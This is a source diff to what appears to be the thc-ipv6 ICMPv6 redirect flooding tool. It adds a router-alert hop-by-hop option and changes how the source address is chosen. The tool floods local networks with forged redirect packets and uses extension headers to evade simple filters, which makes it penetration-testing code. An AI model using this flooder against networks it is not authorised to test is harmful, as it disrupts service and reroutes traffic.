@@ -11,10 +11,11 @@
 #include "thc-ipv6.h"
 
 void help(char *prg) {
-  printf("%s %s (c) 2013 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
+  printf("%s %s (c) 2014 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
   printf("Syntax: %s [-HFD] interface [target] [oldrouter [newrouter]]\n\n", prg);
   printf("Flood the local network with ICMPv6 redirect packets.\n");
   printf("-F/-D/-H add fragment/destination/hopbyhop header to bypass simple filters\n");
+  printf("-a adds hopbyhop with router alert\n");
 //  printf("Use -r to use raw mode.\n\n");
   exit(-1);
 }
@@ -26,19 +27,23 @@ int main(int argc, char *argv[]) {
   unsigned char *dst = thc_resolve6("ff02::1"), *fake_src = NULL, *fake_dst = NULL, *dstmac = NULL, *oldrouter = NULL, *newrouter = NULL;
   int i, j, k, type = NXT_ICMP6, offset = 14, rand_newrouter = 1;
   unsigned char *pkt = NULL, *pkt2 = NULL;
-  int pkt_len = 0, pkt_len2 = 0, rawmode = 0, count = 0, do_hop = 0, do_frag = 0, do_dst = 0;
+  int pkt_len = 0, pkt_len2 = 0, rawmode = 0, count = 0, do_alert = 0, do_hop = 0, do_frag = 0, do_dst = 0;
   int until = 0;
   thc_ipv6_hdr *hdr = NULL, *hdr2 = NULL;
 
   if (argc < 2 || strncmp(argv[1], "-h", 2) == 0)
     help(argv[0]);
 
-  while ((i = getopt(argc, argv, "DFH")) >= 0) {
+  while ((i = getopt(argc, argv, "aDFH")) >= 0) {
     switch (i) {
     case 'F':
       do_frag++;
       break;
     case 'H':
+      do_hop = 1;
+      break;
+    case 'a':
+      do_alert = 1;
       do_hop = 1;
       break;
     case 'D':
@@ -68,7 +73,10 @@ int main(int argc, char *argv[]) {
     if ((mac6 = thc_get_mac(interface, NULL, dst)) == NULL)
       mac6 = thc_get_own_mac(interface);
   } else {
-    oldrouter = thc_get_own_ipv6(interface, dst, PREFER_LINK);
+    if (dst[0] >= 0x20 && dst[0] <= 0xfd)
+      oldrouter = thc_get_own_ipv6(interface, dst, PREFER_GLOBAL);
+    else
+      oldrouter = thc_get_own_ipv6(interface, dst, PREFER_LINK);
     mac6 = thc_get_own_mac(interface);
   }
   if (mac6 == NULL) {
@@ -113,6 +121,11 @@ int main(int argc, char *argv[]) {
   buf[41] = (hdr->pkt_len - offset + 8) / 8;
   memcpy(buf + 48, hdr->pkt + offset, (buf[41] - 1) * 8);
   j = 40 + buf[41] * 8;
+
+  if (do_alert) {
+    buf2[0] = 5;
+    buf2[1] = 2;
+  }
   
   printf("Starting to flood with ICMPv6 redirects on %s (Press Control-C to end, a dot is printed for every 1000 packets):\n", interface);
   while (until != 1) {
